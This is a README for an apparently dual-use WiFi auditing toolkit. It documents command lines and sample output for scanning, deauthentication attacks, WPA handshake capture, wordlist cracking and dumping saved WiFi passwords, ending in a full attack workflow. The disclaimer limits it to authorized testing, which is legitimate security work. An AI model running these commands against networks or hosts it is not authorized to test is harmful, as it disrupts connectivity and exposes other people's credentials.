<p align="center">
  <img src="assets/wifi.jpg" alt="AirStrike Banner" width="100%">
</p>

<h1 align="center">AirStrike</h1>

<p align="center">
  A Scapy-powered wireless auditing toolkit covering the full WiFi penetration testing workflow — from reconnaissance to offline analysis — in a single Python project.
</p>

<p align="center">
  <a href="#-features"><b>Features</b></a> •
  <a href="#-installation"><b>Installation</b></a> •
  <a href="#-usage"><b>Usage</b></a> •
  <a href="#-roadmap"><b>Roadmap</b></a> •
  <a href="#-license"><b>License</b></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.8+-blue.svg" alt="Python">
  <img src="https://img.shields.io/badge/scapy-2.5+-green.svg" alt="Scapy">
  <img src="https://img.shields.io/badge/license-MIT-purple.svg" alt="License">
  <img src="https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey.svg" alt="Platform">
</p>

---

## ⚠️ Disclaimer / هشدار

This project is intended **strictly for educational purposes and authorized security testing**.

این پروژه **صرفاً برای اهداف آموزشی و تست امنیتی مجاز** طراحی شده.

Using these tools against networks you do **not own** or **do not have explicit written permission** to test is **illegal** in most jurisdictions and may result in criminal charges.

استفاده از این ابزارها روی شبکه‌هایی که **مالکش نیستی** یا **مجوز کتبی صریح برای تست‌شون نداری**، در اکثر کشورها **غیرقانونی** است و می‌تونه پیگرد قضایی داشته باشه.

**The author assumes no responsibility for any misuse or damage caused by this software.**
**نویسنده هیچ مسئولیتی در قبال سوءاستفاده یا خسارت ناشی از این نرم‌افزار نمی‌پذیرد.**

---

## ✨ Features / قابلیت‌ها

- 📡 **Network scanning / اسکن شبکه** — discover APs, clients, probe requests, and channels in real time / کشف اکسس‌پوینت‌ها، کلاینت‌ها، probe request ها و کانال‌ها به صورت زنده
- 💥 **Deauthentication attacks / حمله Deauth** — disconnect clients to force re-authentication / قطع کردن کلاینت برای اجبار به re-authentication
- 🤝 **WPA/WPA2 handshake capture / گرفتن handshake** — sniff and save 4-way EAPOL handshakes to `.pcap` / شنود و ذخیره handshake چهارطرفه در فایل `.pcap`
- 🔓 **Offline cracking / کرک آفلاین** — verify handshakes against a wordlist (PBKDF2 + HMAC-SHA1) / تست handshake با wordlist
- 💾 **Saved credential extraction / استخراج پسوردها** — dump locally stored WiFi passwords (Linux / Windows) / درآوردن پسوردهای ذخیره‌شده
- 🧩 **Modular design / طراحی ماژولار** — every module runs standalone / هر ماژول به‌تنهایی قابل اجراست

> New techniques (PMKID, WPS, Evil Twin, …) can be plugged in without breaking the core design.
> تکنیک‌های جدید بدون به‌هم‌ریختن ساختار اصلی قابل اضافه شدن هستن.

---

## 📁 Project Structure / ساختار پروژه

```
AirStrike/
├── src/                          # Source code / کدها
│   ├── __init__.py
│   ├── WScanner.py               # Live WiFi scanner / اسکنر زنده
│   ├── Deauth.py                 # Deauth attack / حمله Deauth
│   ├── Whandshake.py             # Handshake capture / گرفتن handshake
│   ├── wpa_cracker.py            # Offline cracker / کرکر آفلاین
│   └── saved_ap_extractor.py     # Credential extractor / استخراج پسوردها
├── assets/
│   └── wifi.jpg                  # Banner image
├── requirements.txt
├── LICENSE
└── README.md
```

---

## 🛠 Installation / نصب

### Prerequisites / پیش‌نیازها

- Python **3.8+**
- Linux recommended (Kali / Parrot / Ubuntu) / لینوکس توصیه می‌شه
- Wireless adapter supporting **monitor mode** + **packet injection** / آداپتور با پشتیبانی monitor mode و injection
- Root privileges / دسترسی root

### Clone / کلون

```bash
git clone https://github.com/<YOUR_USERNAME>/AirStrike.git
cd AirStrike
```

### Install dependencies / نصب وابستگی‌ها

```bash
pip install -r requirements.txt
```

Or manually / یا دستی:

```bash
pip install scapy tabulate keyboard
```

---

## ⚙️ Adapter Setup (Linux) / آماده‌سازی آداپتور

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Now use wlan0mon as the interface
# حالا از wlan0mon استفاده کن
```

To restore / برای برگردوندن:

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## 🚀 Usage / نحوه استفاده

همه ماژول‌ها توی `src/` هستن. از ریشه پروژه اجرا کن:

```bash
sudo python3 src/WScanner.py <iface>
sudo python3 src/Deauth.py <iface> <ap_mac> [station_mac] [count]
sudo python3 src/Whandshake.py <iface> <channel> <output.pcap>
python3 src/wpa_cracker.py <bssid> <ssid> <pcap_file> <wordlist>
python3 src/saved_ap_extractor.py
```

---

### 📡 1. WScanner.py — Live WiFi Scanner

Scans nearby WiFi networks and displays APs, stations, and probe requests in a live-updating table.

```bash
# Basic scan with channel hopping / اسکن ساده با پرش کانال
sudo python3 src/WScanner.py wlan0

# Single channel / یه کانال خاص
sudo python3 src/WScanner.py wlan0 -c 6

# Channels 1 to 13 / کانال‌های 1 تا 13
sudo python3 src/WScanner.py wlan0 -add 13

# 20 packets per channel / 20 پکت از هر کانال
sudo python3 src/WScanner.py wlan0 -count 20
```

Press **`Q`** to quit. / هر لحظه Q رو بزن تا خارج بشی.

**Output / خروجی نمونه:**

```
Wifi Scanner
--------------------------------------------------------------------------------
Channel = 6

APS:
╭─────────────────┬───────────────────┬──────────────┬─────────╮
│ SSID            │ BSSID             │ STATIONS     │ CHANNEL │
├─────────────────┼───────────────────┼──────────────┼─────────┤
│ HomeWiFi        │ AA:BB:CC:DD:EE:FF │ 11:22:33:..  │    6    │
╰─────────────────┴───────────────────┴──────────────┴─────────╯
```

---

### 💥 2. Deauth.py — Deauthentication Attack

Forces clients to disconnect, triggering a new handshake for capture.

```bash
# Broadcast deauth / Deauth broadcast
sudo python3 src/Deauth.py wlan0 AA:BB:CC:DD:EE:FF

# Target a specific client, 50 frames
sudo python3 src/Deauth.py wlan0 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50

# Infinite loop / حلقه بی‌نهایت
sudo python3 src/Deauth.py wlan0 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 100 loop=1
```

**Notes / نکات:**
- Broadcast deauth doesn't always work on APs with **802.11w (PMF)**
- Pair this with `Whandshake.py` to capture the resulting handshake

---

### 🤝 3. Whandshake.py — Handshake Capture

Captures WPA/WPA2 4-way handshakes into a `.pcap` file.

```bash
sudo python3 src/Whandshake.py wlan0mon 6 handshake.pcap
```

**Typical workflow / Workflow معمول:**

```bash
# Terminal 1 / ترمینال 1
sudo python3 src/Whandshake.py wlan0mon 6 handshake.pcap

# Terminal 2 / ترمینال 2
sudo python3 src/Deauth.py wlan0mon AA:BB:CC:DD:EE:FF
```

> 💡 You need **at least 2 EAPOL frames** to crack / حداقل به 2 فریم EAPOL نیاز داری.

---

### 🔓 4. wpa_cracker.py — Offline Cracker

Cracks captured handshakes against a wordlist.

```bash
# Basic crack / کرک پایه
python3 src/wpa_cracker.py AA:BB:CC:DD:EE:FF HomeWiFi handshake.pcap rockyou.txt

# Custom wordlist / wordlist سفارشی
python3 src/wpa_cracker.py AA:BB:CC:DD:EE:FF HomeWiFi handshake.pcap ~/wordlists/mylist.txt
```

**Output / خروجی:**

```
[*] Found 4 EAPOL-Key frames
[*] BSSID:      AA:BB:CC:DD:EE:FF
[*] STA:        11:22:33:44:55:66
[*] ANonce:     a1b2c3d4...
[*] SNonce:     e5f6a7b8...
[*] MIC:        9c8d7e6f...
Trying: hunter2
********************************************************************************
Found Password: hunter2
********************************************************************************
```

**Notes / نکات:**
- Only supports **WPA/WPA2-PSK** (HMAC-SHA1) / فقط WPA/WPA2-PSK
- WPA3-SAE not supported yet
- No GPU acceleration

---

### 💾 5. saved_ap_extractor.py — Credential Extractor

Dumps locally saved WiFi credentials (Linux / Windows).

```bash
sudo python3 src/saved_ap_extractor.py
```

**As a module / به‌عنوان ماژول:**

```python
from src.saved_ap_extractor import Saved_AP

s = Saved_AP()

# Print a table / چاپ جدول
print(s.tabulate())

# Get list / گرفتن لیست
for ssid, password in s.list_AP():
    print(ssid, "->", password)

# Save to JSON / ذخیره به JSON
s.save("wifi_dump.json", indent=4)
```

**Output / خروجی:**

```
╭─────────────────┬──────────────╮
│ SSID            │ Password     │
├─────────────────┼──────────────┤
│ HomeWiFi        │ hunter2      │
│ Cafe-Guest      │ coffee123    │
╰─────────────────┴──────────────╯
```

---

## 🧪 Full Workflow / Workflow کامل

| Step / مرحله | Tool / ابزار | Goal / هدف |
|:----:|------|------|
| 1️⃣ | `WScanner.py` | Find target AP + clients |
| 2️⃣ | `Deauth.py` | Force re-authentication |
| 3️⃣ | `Whandshake.py` | Capture the 4-way handshake |
| 4️⃣ | `wpa_cracker.py` | Crack with a wordlist |
| 5️⃣ | `saved_ap_extractor.py` | Dump local credentials |

**Complete example / مثال کامل:**

```bash
# 0. Monitor mode / حالت مانیتور
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 1. Scan for targets / اسکن برای هدف
sudo python3 src/WScanner.py wlan0mon -c 6
# → AP BSSID: AA:BB:CC:DD:EE:FF
# → STA MAC:  11:22:33:44:55:66

# 2. Start capture in terminal 1
sudo python3 src/Whandshake.py wlan0mon 6 handshake.pcap

# 3. In terminal 2, force re-auth
sudo python3 src/Deauth.py wlan0mon AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 50

# 4. Crack / کرک
python3 src/wpa_cracker.py AA:BB:CC:DD:EE:FF HomeWiFi handshake.pcap rockyou.txt

# 5. Dump saved credentials
sudo python3 src/saved_ap_extractor.py
```

---

## 🧯 Troubleshooting / عیب‌یابی

| Issue / مشکل | Fix / راه‌حل |
|-------|-----|
| `Permission denied` | Run with `sudo` |
| No packets captured | Check monitor mode & channel |
| `ModuleNotFoundError: scapy` | `pip install scapy` |
| `keyboard` import error | `pip install keyboard` + run as root |
| No APs found | `iw dev <iface> set channel <n>` |
| `sendp` fails | Adapter doesn't support injection |
| Handshake not cracking | Verify 4 EAPOL frames, check SSID |
| Deauth has no effect | AP may use 802.11w (PMF) |

---

## 🗺 Roadmap / نقشه راه

- [ ] PMKID attack (clientless) / حمله PMKID بدون کلاینت
- [ ] WPS PIN attack / حمله WPS PIN
- [ ] Evil Twin / rogue AP
- [ ] GPU-accelerated cracking / کرک با شتاب GPU
- [ ] JSON / CSV export for scanner
- [ ] WPA3 detection & fingerprinting
- [ ] Docker image / ایمیج Docker
- [ ] macOS support

---

## 🤝 Contributing / مشارکت

Pull requests are welcome! For major changes, please open an issue first.

PR ها خوش‌آمدن! برای تغییرات بزرگ، اول یه issue باز کن.

---

## 📜 License / لایسنس

Released under the **MIT License** with an **Ethical Use Clause**.
تحت **MIT License** با **شرط استفاده اخلاقی** منتشر شده.

See [`LICENSE`](./LICENSE) for details.

---

## 🙏 Credits / اعتبارها

- [Scapy](https://scapy.net/) — packet crafting & sniffing
- [tabulate](https://pypi.org/project/tabulate/) — table formatting
- [keyboard](https://pypi.org/project/keyboard/) — hotkey handling

---

<p align="center">
  ⭐ If you find AirStrike useful, give it a star! ⭐<br>
  ⭐ اگه AirStrike برات مفید بود، یه ستاره بده! ⭐
</p>